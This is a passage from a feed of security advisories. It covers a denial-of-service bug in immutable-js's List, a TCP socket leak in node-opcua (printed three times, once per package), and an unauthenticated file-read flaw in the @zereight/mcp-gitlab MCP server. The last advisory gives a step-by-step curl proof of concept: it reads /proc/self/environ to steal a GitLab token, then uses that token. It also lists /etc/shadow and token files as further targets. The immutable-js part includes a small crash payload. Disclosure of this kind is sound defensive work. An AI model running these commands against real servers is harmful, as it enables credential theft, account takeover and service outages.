<p>There is also a companion <strong>silent data-corruption</strong> issue in <code>setSize</code>:</p>
<pre><code class="language-js">List([1, 2, 3]).setSize(2 ** 31); // before fix =&gt; size 0  (silently cleared)
List([1, 2, 3]).setSize(2 ** 32 + 5); // before fix =&gt; size 5  (huge value wraps to 5)
</code></pre>
<h2 id="impact">Impact</h2>
<p>Availability only. A reachable configuration is any endpoint that routes untrusted input into a <code>List</code> index or a <code>setIn</code>/<code>updateIn</code> key-path — which the extremely common <code>state = fromJS(body); state.setIn(userPath, value)</code> pattern does (config stores, document/collection editors, redux-immutable reducers, JSON-Patch endpoints, etc.).</p>
<p>No confidentiality or integrity impact, no RCE. The companion <code>setSize</code> bug can silently corrupt application state (wrong size) without crashing.</p>
<h2 id="reproduction-immutable-517">Reproduction (immutable 5.1.7)</h2>
<pre><code class="language-ts">import { fromJS, List } from 'immutable';

// 1) Populated List: OOM -&gt; process abort (SIGABRT, exit 134) within ~2s
fromJS({ items: new Array(64).fill(0) }).setIn(['items', '1073741824'], 'x');

// 2) Empty List: hangs forever, uncatchable
List().set(2 ** 30, 'x');

// 3) Silent truncation
List([1, 2, 3]).setSize(2 ** 31); // =&gt; size 0
List([1, 2, 3]).setSize(2 ** 32 + 5); // =&gt; size 5
</code></pre>
<p>A remote 43-byte HTTP request (<code>{"path":["items","1073741824"],"value":"x"}</code>) is sufficient to abort a worker that applies it via <code>state = state.setIn(path, value)</code>.</p>
<p>Any index in <code>[2 ** 30, 2 ** 31)</code> works (<code>1073741824</code>, <code>2000000000</code>, …). An index in <code>[2 ** 31, 2 ** 32)</code> does not crash — it silently wraps (clearing the List) via the same root cause.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>List</code> stores its values in a 32-wide trie (<code>SHIFT = 5</code>, so each level addresses 5 more bits) and uses <strong>signed 32-bit bitwise arithmetic</strong> throughout <code>setListBounds()</code> (<code>src/List.js</code>):</p>
<ol>
<li><strong>Infinite loop (the hang / OOM).</strong> The level-raising loop</li>
</ol>
<pre><code class="language-js">while (newTailOffset &gt;= 1 &lt;&lt; (newLevel + SHIFT)) {
  newRoot = new VNode(
    newRoot &amp;&amp; newRoot.array.length ? [newRoot] : [],
    owner
  );
  newLevel += SHIFT;
}
</code></pre>
<p>relies on <code>1 &lt;&lt; (newLevel + SHIFT)</code>. A JavaScript shift count is taken <strong>mod 32</strong>, so once <code>newLevel + SHIFT</code> reaches <code>31</code> the term goes <strong>negative</strong> (<code>1 &lt;&lt; 31 === -2147483648</code>) and at <code>32</code> wraps to <code>1</code> (<code>1 &lt;&lt; 35 === 8</code>). The comparison then stays <code>true</code> forever and the loop never terminates. On a populated <code>List</code>, each iteration retains a new <code>VNode</code> (<code>[newRoot]</code>), so the heap fills and V8 aborts; on an empty <code>List</code> it spins on CPU without allocating.</p>
<ol start="2">
<li><strong>Silent wraparound (the <code>setSize</code> corruption).</strong> The <code>begin |= 0</code> / <code>end |= 0</code> coercion (<code>ToInt32</code>) silently wraps large finite values (<code>(2 ** 31) | 0 === -2147483648</code>, <code>(2 ** 32 + 5) | 0 === 5</code>), producing a wrong resulting size instead of an error.</li>
</ol>
<p>The threshold is <code>2 ** 30</code>: that is the largest size for which <code>1 &lt;&lt; (newLevel + SHIFT)</code> stays a valid positive 32-bit integer throughout the loops (<code>newLevel + SHIFT</code> stays ≤ 30).</p>
<h2 id="remediation">Remediation</h2>
<p>The fix is contained to <code>setListBounds()</code> in <code>src/List.js</code>:</p>
<ol>
<li><p><strong>Validate up front, before the lossy <code>| 0</code> coercion.</strong> Compute the intended origin and capacity in full precision and throw a clear, catchable <code>RangeError</code> when they exceed the addressable range (<code>MAX_LIST_SIZE = 2 ** 30</code>). <code>Infinity</code>/<code>NaN</code> are left to the existing <code>| 0 → 0</code> behaviour (so <code>setSize(Infinity)</code> stays <code>0</code> and <code>slice(0, Infinity)</code> still means "to the end").</p>
</li>
<li><p><strong>Stop the shift from wrapping.</strong> Replace <code>1 &lt;&lt; exp</code> in the level-raising loops with a helper that uses the cheap bitwise shift while it is exact (<code>exp ≤ 30</code>, the common path including every <code>push</code>/<code>setSize</code>/<code>slice</code>) and falls back to the non-wrapping <code>2 ** exp</code> only for the rare deep trees reached when a negative origin (<code>unshift</code> / negative index) is normalized to a large positive capacity (<code>exp</code> can reach 35 there, where <code>1 &lt;&lt; 35</code> would wrap to 8).</p>
</li>
</ol>
<p>This turns every hang, the misleading <code>"Maximum call stack size exceeded"</code>, the OOM/<code>SIGABRT</code>, and the silent <code>setSize</code> truncation into one descriptive <code>RangeError</code>, preserves all behaviour for sizes <code>&lt; 2 ** 30</code>, and keeps the hot <code>push</code> path on the fast bitwise shift (the <code>2 ** exp</code> branch is never reached by non-negative operations).</p>
<h3 id="is-the-new-limit-a-breaking-change">Is the new limit a breaking change?</h3>
<p>No working code is affected. A <code>List</code> could never actually hold <code>≥ 2 ** 30</code> values before — the attempt hung, crashed, or silently corrupted the size. The limit was already implicit in the 32-bit trie; the fix only makes it explicit and catchable, mirroring native JS arrays (<code>new Array(2 ** 32)</code> → <code>RangeError: Invalid array length</code>). The single observable behaviour change is that <code>setSize(hugeValue)</code>, which used to return a silently wrong size, now throws. <code>2 ** 30</code> ≈ 1.07 billion entries (~8 GB of pointers alone), far beyond any practical use.</p>
<h2 id="mitigations-for-users-who-cannot-upgrade-immediately">Mitigations (for users who cannot upgrade immediately)</h2>
<ul>
<li>Validate/clamp any externally supplied <code>List</code> index or <code>setIn</code>/<code>updateIn</code> key-path segment against a sane maximum before passing it to immutable.</li>
<li>Reject numeric path segments <code>≥ 2 ** 30</code>.</li>
<li>Run request handling in a worker that can be restarted, and cap the heap (<code>--max-old-space-size</code>) so an abort is contained.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/immutable-js/immutable-js/security/advisories/GHSA-v56q-mh7h-f735">https://github.com/immutable-js/immutable-js/security/advisories/GHSA-v56q-mh7h-f735</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59879">https://nvd.nist.gov/vuln/detail/CVE-2026-59879</a></li>
<li><a href="https://github.com/immutable-js/immutable-js/commit/a1a1ee412dcaa380ab325196283d06594ffe4b84">https://github.com/immutable-js/immutable-js/commit/a1a1ee412dcaa380ab325196283d06594ffe4b84</a></li>
<li><a href="https://github.com/immutable-js/immutable-js/commit/f0bc997d8eb9886aff2236635aa210a95a04304a">https://github.com/immutable-js/immutable-js/commit/f0bc997d8eb9886aff2236635aa210a95a04304a</a></li>
<li><a href="https://github.com/immutable-js/immutable-js/releases/tag/v4.3.9">https://github.com/immutable-js/immutable-js/releases/tag/v4.3.9</a></li>
<li><a href="https://github.com/immutable-js/immutable-js/releases/tag/v5.1.8">https://github.com/immutable-js/immutable-js/releases/tag/v5.1.8</a></li>
<li><a href="https://github.com/immutable-js/immutable-js/releases/tag/v3.8.4">https://github.com/immutable-js/immutable-js/releases/tag/v3.8.4</a></li>
<li><a href="https://github.com/advisories/GHSA-v56q-mh7h-f735">https://github.com/advisories/GHSA-v56q-mh7h-f735</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v56q-mh7h-f735</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-21T18:36:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-opcua] node-opcua: TCP Socket Leak (FIN-WAIT-2) via keepalive reconnection cycle - Resource Exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-r2pf-9cw4-5j65</id>
        <link href="https://github.com/advisories/GHSA-r2pf-9cw4-5j65"/>
        <updated>2026-09-16T16:19:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">SUMMARY</h2>
<p>A combination of bugs in node-opcua causes unlimited TCP socket accumulation (FIN-WAIT-2 state) during automatic reconnection, leading to memory exhaustion and eventual container/process crash (OOM kill). The issue is triggered by the default configuration (keepSessionAlive: true) when the OPC UA server has clock skew relative to the client.</p>
<p>Affected version: Tested on 2.169.0 (latest as of April 2026).</p>
<h2 id="environment">ENVIRONMENT</h2>
<ul>
<li>Node.js: v24.11.0</li>
<li>node-opcua: 2.169.0</li>
<li>OS: Linux (containerized via Podman, slirp4netns networking)</li>
<li>OPC UA Server: Industrial PLC (opc.tcp endpoint), clock skew of ~50 minutes ahead of client</li>
<li>Client config: keepSessionAlive: true (default), keepAliveInterval: 3000, securityMode: None, securityPolicy: None</li>
</ul>
<h2 id="root-cause-analysis">ROOT CAUSE ANALYSIS</h2>
<p>Bug #1 - ClientTCP_transport._on_ACK_response() uses socket.end() instead of socket.destroy()</p>
<p>File: node-opcua-transport/src/client_tcp_transport.ts, _on_ACK_response() method</p>
<p>When the HEL/ACK handshake fails during a reconnection attempt, the error handler calls socket.end():</p>
<pre><code>if (err || !data) {
    externalCallback(err || new Error("no data"));
    if (this._socket) {
        this._socket.end();   // &lt;- sends TCP FIN, leaves socket in FIN-WAIT-2
    }
}
</code></pre>
<p>socket.end() sends a TCP FIN and waits for the peer to close its side. If the peer doesn't respond (common with PLCs), the socket remains in FIN-WAIT-2 state indefinitely, leaking file descriptors and memory.
During rapid reconnection cycles (triggered by Bug #2 below), every failed HEL/ACK creates a new leaked socket.</p>
<hr>
<p>Bug #2 - ClientSessionKeepAliveManager._ping_server() treats BadInvalidTimestamp as network outage</p>
<p>File: node-opcua-client/src/client_session_keepalive_manager.ts, _ping_server() method</p>
<p>The keepalive manager reads Server.ServerStatus.CurrentTime on each ping cycle. If the server responds with BadInvalidTimestamp (because the client's RequestHeader.timestamp falls outside the server's tolerance window due to clock skew), the manager treats this as a fatal network error:</p>
<pre><code>// Any error -&gt; emit("failure") -&gt; terminateConnection() -&gt; forceConnectionBreak()
</code></pre>
<p>This triggers a full transport-level reconnection on every keepalive cycle (every keepAliveInterval ms). Combined with Bug #1, each reconnection attempt leaks one TCP socket in FIN-WAIT-2.
Impact amplification: With keepAliveInterval: 3000 (3 seconds), the client leaks ~20 sockets/minute, ~1200/hour, exhausting resources in hours.</p>
<h2 id="reproduction-steps">REPRODUCTION STEPS</h2>
<ol>
<li>Set up an OPC UA server with a clock skewed more than the server's timestamp tolerance ahead of the client.</li>
<li>Connect using node-opcua with default settings (keepSessionAlive: true).</li>
<li>Monitor TCP sockets: ss -antp | grep FIN-WAIT-2 | wc -l</li>
<li>Observe FIN-WAIT-2 count growing continuously (approximately one per keepalive interval).</li>
<li>Eventually the process runs out of file descriptors or memory and crashes.</li>
</ol>
<h2 id="suggested-fixes">SUGGESTED FIXES</h2>
<p>For Bug #1 (_on_ACK_response):</p>
<pre><code>// Replace socket.end() with socket.destroy()
if (this._socket) {
    this._socket.destroy();
}
</code></pre>
<p>For Bug #2 (_ping_server):
Distinguish between transport-level errors (actual network outage) and application-level OPC UA status codes like BadInvalidTimestamp. The latter indicates the server is reachable and the session is alive - only the timestamp validation failed. The keepalive should not trigger reconnection.</p>
<h2 id="reporter">REPORTER</h2>
<p>Marco Velluso @Velluso
<a href="mailto:velluso.marco64@gmail.com">velluso.marco64@gmail.com</a>
Requesting CVE assignment and credit as reporter upon fix publication.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/node-opcua/node-opcua/security/advisories/GHSA-r2pf-9cw4-5j65">https://github.com/node-opcua/node-opcua/security/advisories/GHSA-r2pf-9cw4-5j65</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/pull/1497">https://github.com/node-opcua/node-opcua/pull/1497</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/commit/1959cbb8946b386d2e24a1cce05b7148099d36e7">https://github.com/node-opcua/node-opcua/commit/1959cbb8946b386d2e24a1cce05b7148099d36e7</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/commit/481664fa6ba8204737c5a92797ff68c3ae780c1c">https://github.com/node-opcua/node-opcua/commit/481664fa6ba8204737c5a92797ff68c3ae780c1c</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/commit/4d59197e2dbd82791d7f36dad7da178715e0c27a">https://github.com/node-opcua/node-opcua/commit/4d59197e2dbd82791d7f36dad7da178715e0c27a</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/commit/dc406fd2d364aa69dd173be21ed32a7ff425017a">https://github.com/node-opcua/node-opcua/commit/dc406fd2d364aa69dd173be21ed32a7ff425017a</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/releases/tag/v2.170.0">https://github.com/node-opcua/node-opcua/releases/tag/v2.170.0</a></li>
<li><a href="https://github.com/advisories/GHSA-r2pf-9cw4-5j65">https://github.com/advisories/GHSA-r2pf-9cw4-5j65</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r2pf-9cw4-5j65</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-16T16:19:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-opcua-client] node-opcua: TCP Socket Leak (FIN-WAIT-2) via keepalive reconnection cycle - Resource Exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-r2pf-9cw4-5j65</id>
        <link href="https://github.com/advisories/GHSA-r2pf-9cw4-5j65"/>
        <updated>2026-09-16T16:19:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">SUMMARY</h2>
<p>A combination of bugs in node-opcua causes unlimited TCP socket accumulation (FIN-WAIT-2 state) during automatic reconnection, leading to memory exhaustion and eventual container/process crash (OOM kill). The issue is triggered by the default configuration (keepSessionAlive: true) when the OPC UA server has clock skew relative to the client.</p>
<p>Affected version: Tested on 2.169.0 (latest as of April 2026).</p>
<h2 id="environment">ENVIRONMENT</h2>
<ul>
<li>Node.js: v24.11.0</li>
<li>node-opcua: 2.169.0</li>
<li>OS: Linux (containerized via Podman, slirp4netns networking)</li>
<li>OPC UA Server: Industrial PLC (opc.tcp endpoint), clock skew of ~50 minutes ahead of client</li>
<li>Client config: keepSessionAlive: true (default), keepAliveInterval: 3000, securityMode: None, securityPolicy: None</li>
</ul>
<h2 id="root-cause-analysis">ROOT CAUSE ANALYSIS</h2>
<p>Bug #1 - ClientTCP_transport._on_ACK_response() uses socket.end() instead of socket.destroy()</p>
<p>File: node-opcua-transport/src/client_tcp_transport.ts, _on_ACK_response() method</p>
<p>When the HEL/ACK handshake fails during a reconnection attempt, the error handler calls socket.end():</p>
<pre><code>if (err || !data) {
    externalCallback(err || new Error("no data"));
    if (this._socket) {
        this._socket.end();   // &lt;- sends TCP FIN, leaves socket in FIN-WAIT-2
    }
}
</code></pre>
<p>socket.end() sends a TCP FIN and waits for the peer to close its side. If the peer doesn't respond (common with PLCs), the socket remains in FIN-WAIT-2 state indefinitely, leaking file descriptors and memory.
During rapid reconnection cycles (triggered by Bug #2 below), every failed HEL/ACK creates a new leaked socket.</p>
<hr>
<p>Bug #2 - ClientSessionKeepAliveManager._ping_server() treats BadInvalidTimestamp as network outage</p>
<p>File: node-opcua-client/src/client_session_keepalive_manager.ts, _ping_server() method</p>
<p>The keepalive manager reads Server.ServerStatus.CurrentTime on each ping cycle. If the server responds with BadInvalidTimestamp (because the client's RequestHeader.timestamp falls outside the server's tolerance window due to clock skew), the manager treats this as a fatal network error:</p>
<pre><code>// Any error -&gt; emit("failure") -&gt; terminateConnection() -&gt; forceConnectionBreak()
</code></pre>
<p>This triggers a full transport-level reconnection on every keepalive cycle (every keepAliveInterval ms). Combined with Bug #1, each reconnection attempt leaks one TCP socket in FIN-WAIT-2.
Impact amplification: With keepAliveInterval: 3000 (3 seconds), the client leaks ~20 sockets/minute, ~1200/hour, exhausting resources in hours.</p>
<h2 id="reproduction-steps">REPRODUCTION STEPS</h2>
<ol>
<li>Set up an OPC UA server with a clock skewed more than the server's timestamp tolerance ahead of the client.</li>
<li>Connect using node-opcua with default settings (keepSessionAlive: true).</li>
<li>Monitor TCP sockets: ss -antp | grep FIN-WAIT-2 | wc -l</li>
<li>Observe FIN-WAIT-2 count growing continuously (approximately one per keepalive interval).</li>
<li>Eventually the process runs out of file descriptors or memory and crashes.</li>
</ol>
<h2 id="suggested-fixes">SUGGESTED FIXES</h2>
<p>For Bug #1 (_on_ACK_response):</p>
<pre><code>// Replace socket.end() with socket.destroy()
if (this._socket) {
    this._socket.destroy();
}
</code></pre>
<p>For Bug #2 (_ping_server):
Distinguish between transport-level errors (actual network outage) and application-level OPC UA status codes like BadInvalidTimestamp. The latter indicates the server is reachable and the session is alive - only the timestamp validation failed. The keepalive should not trigger reconnection.</p>
<h2 id="reporter">REPORTER</h2>
<p>Marco Velluso @Velluso
<a href="mailto:velluso.marco64@gmail.com">velluso.marco64@gmail.com</a>
Requesting CVE assignment and credit as reporter upon fix publication.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/node-opcua/node-opcua/security/advisories/GHSA-r2pf-9cw4-5j65">https://github.com/node-opcua/node-opcua/security/advisories/GHSA-r2pf-9cw4-5j65</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/pull/1497">https://github.com/node-opcua/node-opcua/pull/1497</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/commit/1959cbb8946b386d2e24a1cce05b7148099d36e7">https://github.com/node-opcua/node-opcua/commit/1959cbb8946b386d2e24a1cce05b7148099d36e7</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/commit/481664fa6ba8204737c5a92797ff68c3ae780c1c">https://github.com/node-opcua/node-opcua/commit/481664fa6ba8204737c5a92797ff68c3ae780c1c</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/commit/4d59197e2dbd82791d7f36dad7da178715e0c27a">https://github.com/node-opcua/node-opcua/commit/4d59197e2dbd82791d7f36dad7da178715e0c27a</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/commit/dc406fd2d364aa69dd173be21ed32a7ff425017a">https://github.com/node-opcua/node-opcua/commit/dc406fd2d364aa69dd173be21ed32a7ff425017a</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/releases/tag/v2.170.0">https://github.com/node-opcua/node-opcua/releases/tag/v2.170.0</a></li>
<li><a href="https://github.com/advisories/GHSA-r2pf-9cw4-5j65">https://github.com/advisories/GHSA-r2pf-9cw4-5j65</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r2pf-9cw4-5j65</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-16T16:19:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-opcua-transport] node-opcua: TCP Socket Leak (FIN-WAIT-2) via keepalive reconnection cycle - Resource Exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-r2pf-9cw4-5j65</id>
        <link href="https://github.com/advisories/GHSA-r2pf-9cw4-5j65"/>
        <updated>2026-09-16T16:19:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">SUMMARY</h2>
<p>A combination of bugs in node-opcua causes unlimited TCP socket accumulation (FIN-WAIT-2 state) during automatic reconnection, leading to memory exhaustion and eventual container/process crash (OOM kill). The issue is triggered by the default configuration (keepSessionAlive: true) when the OPC UA server has clock skew relative to the client.</p>
<p>Affected version: Tested on 2.169.0 (latest as of April 2026).</p>
<h2 id="environment">ENVIRONMENT</h2>
<ul>
<li>Node.js: v24.11.0</li>
<li>node-opcua: 2.169.0</li>
<li>OS: Linux (containerized via Podman, slirp4netns networking)</li>
<li>OPC UA Server: Industrial PLC (opc.tcp endpoint), clock skew of ~50 minutes ahead of client</li>
<li>Client config: keepSessionAlive: true (default), keepAliveInterval: 3000, securityMode: None, securityPolicy: None</li>
</ul>
<h2 id="root-cause-analysis">ROOT CAUSE ANALYSIS</h2>
<p>Bug #1 - ClientTCP_transport._on_ACK_response() uses socket.end() instead of socket.destroy()</p>
<p>File: node-opcua-transport/src/client_tcp_transport.ts, _on_ACK_response() method</p>
<p>When the HEL/ACK handshake fails during a reconnection attempt, the error handler calls socket.end():</p>
<pre><code>if (err || !data) {
    externalCallback(err || new Error("no data"));
    if (this._socket) {
        this._socket.end();   // &lt;- sends TCP FIN, leaves socket in FIN-WAIT-2
    }
}
</code></pre>
<p>socket.end() sends a TCP FIN and waits for the peer to close its side. If the peer doesn't respond (common with PLCs), the socket remains in FIN-WAIT-2 state indefinitely, leaking file descriptors and memory.
During rapid reconnection cycles (triggered by Bug #2 below), every failed HEL/ACK creates a new leaked socket.</p>
<hr>
<p>Bug #2 - ClientSessionKeepAliveManager._ping_server() treats BadInvalidTimestamp as network outage</p>
<p>File: node-opcua-client/src/client_session_keepalive_manager.ts, _ping_server() method</p>
<p>The keepalive manager reads Server.ServerStatus.CurrentTime on each ping cycle. If the server responds with BadInvalidTimestamp (because the client's RequestHeader.timestamp falls outside the server's tolerance window due to clock skew), the manager treats this as a fatal network error:</p>
<pre><code>// Any error -&gt; emit("failure") -&gt; terminateConnection() -&gt; forceConnectionBreak()
</code></pre>
<p>This triggers a full transport-level reconnection on every keepalive cycle (every keepAliveInterval ms). Combined with Bug #1, each reconnection attempt leaks one TCP socket in FIN-WAIT-2.
Impact amplification: With keepAliveInterval: 3000 (3 seconds), the client leaks ~20 sockets/minute, ~1200/hour, exhausting resources in hours.</p>
<h2 id="reproduction-steps">REPRODUCTION STEPS</h2>
<ol>
<li>Set up an OPC UA server with a clock skewed more than the server's timestamp tolerance ahead of the client.</li>
<li>Connect using node-opcua with default settings (keepSessionAlive: true).</li>
<li>Monitor TCP sockets: ss -antp | grep FIN-WAIT-2 | wc -l</li>
<li>Observe FIN-WAIT-2 count growing continuously (approximately one per keepalive interval).</li>
<li>Eventually the process runs out of file descriptors or memory and crashes.</li>
</ol>
<h2 id="suggested-fixes">SUGGESTED FIXES</h2>
<p>For Bug #1 (_on_ACK_response):</p>
<pre><code>// Replace socket.end() with socket.destroy()
if (this._socket) {
    this._socket.destroy();
}
</code></pre>
<p>For Bug #2 (_ping_server):
Distinguish between transport-level errors (actual network outage) and application-level OPC UA status codes like BadInvalidTimestamp. The latter indicates the server is reachable and the session is alive - only the timestamp validation failed. The keepalive should not trigger reconnection.</p>
<h2 id="reporter">REPORTER</h2>
<p>Marco Velluso @Velluso
<a href="mailto:velluso.marco64@gmail.com">velluso.marco64@gmail.com</a>
Requesting CVE assignment and credit as reporter upon fix publication.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/node-opcua/node-opcua/security/advisories/GHSA-r2pf-9cw4-5j65">https://github.com/node-opcua/node-opcua/security/advisories/GHSA-r2pf-9cw4-5j65</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/pull/1497">https://github.com/node-opcua/node-opcua/pull/1497</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/commit/1959cbb8946b386d2e24a1cce05b7148099d36e7">https://github.com/node-opcua/node-opcua/commit/1959cbb8946b386d2e24a1cce05b7148099d36e7</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/commit/481664fa6ba8204737c5a92797ff68c3ae780c1c">https://github.com/node-opcua/node-opcua/commit/481664fa6ba8204737c5a92797ff68c3ae780c1c</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/commit/4d59197e2dbd82791d7f36dad7da178715e0c27a">https://github.com/node-opcua/node-opcua/commit/4d59197e2dbd82791d7f36dad7da178715e0c27a</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/commit/dc406fd2d364aa69dd173be21ed32a7ff425017a">https://github.com/node-opcua/node-opcua/commit/dc406fd2d364aa69dd173be21ed32a7ff425017a</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/releases/tag/v2.170.0">https://github.com/node-opcua/node-opcua/releases/tag/v2.170.0</a></li>
<li><a href="https://github.com/advisories/GHSA-r2pf-9cw4-5j65">https://github.com/advisories/GHSA-r2pf-9cw4-5j65</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r2pf-9cw4-5j65</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-16T16:19:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@zereight/mcp-gitlab] @zereight/mcp-gitlab: Unauthenticated arbitrary file read via `upload_markdown` enables PAT exfiltration and full account takeover]]></title>
        <id>https://github.com/advisories/GHSA-cv3r-c5h8-f4g5</id>
        <link href="https://github.com/advisories/GHSA-cv3r-c5h8-f4g5"/>
        <updated>2026-09-16T13:48:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The SSE transport mode (<code>SSE=true</code>) exposes all MCP tools without any authentication. The <code>upload_markdown</code> tool reads arbitrary files from the server's local filesystem via an unsanitized <code>file_path</code> parameter and uploads them to a GitLab project. Combined, any unauthenticated network-reachable attacker can read <code>/proc/self/environ</code> to steal the server's <code>GITLAB_PERSONAL_ACCESS_TOKEN</code> and achieve full GitLab account takeover. This is the default configuration for Docker deployments.</p>
<h3 id="details">Details</h3>
<p>Two issues chain together:</p>
<p><strong>1. No authentication on SSE transport (<code>src/index.ts:7350-7388</code>)</strong></p>
<p>When <code>SSE=true</code> (the intended mode for Docker deployments per <code>docker-compose.yaml</code>), the <code>/sse</code> and <code>/messages</code> endpoints have zero authentication middleware. Any HTTP client that can reach the port can establish a session and invoke all ~100+ tools using the server's configured PAT.</p>
<pre><code class="language-typescript">// src/index.ts:7354 — no auth check
app.get("/sse", async (_: Request, res: Response) =&gt; {
    const serverInstance = createServer();
    const transport = new SSEServerTransport("/messages", res);
    await serverInstance.connect(transport);
});
</code></pre>
<p>Remote Authorization (<code>REMOTE_AUTHORIZATION=true</code>) is explicitly incompatible with SSE mode (<code>src/index.ts:1833-1839</code>), so there is no way to add per-request auth in this transport.</p>
<p><strong>2. Arbitrary file read in <code>upload_markdown</code> (<code>src/index.ts:5461-5503</code>)</strong></p>
<p>The <code>upload_markdown</code> tool calls <code>fs.readFileSync(filePath)</code> where <code>filePath</code> comes directly from user input with no validation. The Zod schema (<code>src/schemas.ts:2150-2153</code>) defines <code>file_path</code> as <code>z.string()</code> with no path restrictions, allowlists, or sandboxing.</p>
<pre><code class="language-typescript">async function markdownUpload(projectId: string, filePath: string) {
    if (!fs.existsSync(filePath)) {
        throw new Error(`File not found: ${filePath}`);
    }
    const fileBuffer = fs.readFileSync(filePath);  // Arbitrary file read — no path validation
    // ... uploads to GitLab project via POST /projects/:id/uploads
}
</code></pre>
<p>This tool is in the <code>users</code> toolset, which is <strong>enabled by default</strong>.</p>
<p><strong>Docker amplification:</strong> The <code>Dockerfile</code> has no <code>USER</code> directive, so the process runs as root. The <code>docker-compose.yaml</code> maps <code>3002:3002</code>, which binds <code>0.0.0.0</code> by default, exposing the unauthenticated endpoint to the network.</p>
<h3 id="poc">PoC</h3>
<p><strong>Prerequisites:</strong></p>
<ul>
<li>A running <code>@zereight/mcp-gitlab</code> instance with <code>SSE=true</code> and <code>GITLAB_PERSONAL_ACCESS_TOKEN</code> set (this is the default Docker deployment config)</li>
<li>Network access to the server's port (default: 3002)</li>
<li>A GitLab project ID the PAT has write access to (use <code>list_projects</code> to enumerate)</li>
</ul>
<p><strong>Steps:</strong></p>
<pre><code class="language-bash"># 1. Connect to the unauthenticated SSE endpoint and capture the session ID
SESSION_ID=$(curl -s -N http://&lt;HOST&gt;:3002/sse | head -1 | grep -oP 'sessionId=\K[^&amp;\s]+')

# 2. (Optional) Enumerate accessible projects to find a writable project ID
curl -X POST "http://&lt;HOST&gt;:3002/messages?sessionId=$SESSION_ID" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "tools/call",
    "params": {
      "name": "list_projects",
      "arguments": {"owned": true}
    }
  }'

# 3. Read /proc/self/environ (contains GITLAB_PERSONAL_ACCESS_TOKEN in plaintext)
#    and upload it to a GitLab project
curl -X POST "http://&lt;HOST&gt;:3002/messages?sessionId=$SESSION_ID" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 2,
    "method": "tools/call",
    "params": {
      "name": "upload_markdown",
      "arguments": {
        "project_id": "&lt;WRITABLE_PROJECT_ID&gt;",
        "file_path": "/proc/self/environ"
      }
    }
  }'

# 4. The response contains a GitLab upload URL like:
#    {"markdown": "![environ](/uploads/abc123def456/environ)", "url": "/uploads/abc123def456/environ"}
#
# 5. Retrieve the uploaded file from GitLab:
curl "https://gitlab.example.com/&lt;namespace&gt;/&lt;project&gt;/uploads/abc123def456/environ"

# 6. The file contains NUL-separated environment variables including:
#    GITLAB_PERSONAL_ACCESS_TOKEN=glpat-xxxxxxxxxxxxxxxxxxxx
#
# 7. Use the stolen PAT for full GitLab API access:
curl -H "Private-Token: glpat-xxxxxxxxxxxxxxxxxxxx" "https://gitlab.example.com/api/v4/user"
</code></pre>
<p><strong>Other exfiltrable targets (running as root in Docker):</strong></p>
<table>
<thead>
<tr>
<th>File</th>
<th>Contents</th>
</tr>
</thead>
<tbody><tr>
<td><code>/proc/self/environ</code></td>
<td>All env vars including <code>GITLAB_PERSONAL_ACCESS_TOKEN=glpat-xxxxx</code></td>
</tr>
<tr>
<td><code>/proc/self/cmdline</code></td>
<td>Command line args (token if passed via CLI)</td>
</tr>
<tr>
<td><code>/etc/shadow</code></td>
<td>System password hashes</td>
</tr>
<tr>
<td><code>/app/build/index.js</code></td>
<td>Full application source code</td>
</tr>
<tr>
<td><code>~/.gitlab-mcp-token.json</code></td>
<td>OAuth tokens (if OAuth mode was used)</td>
</tr>
</tbody></table>
<h3 id="impact">Impact</h3>
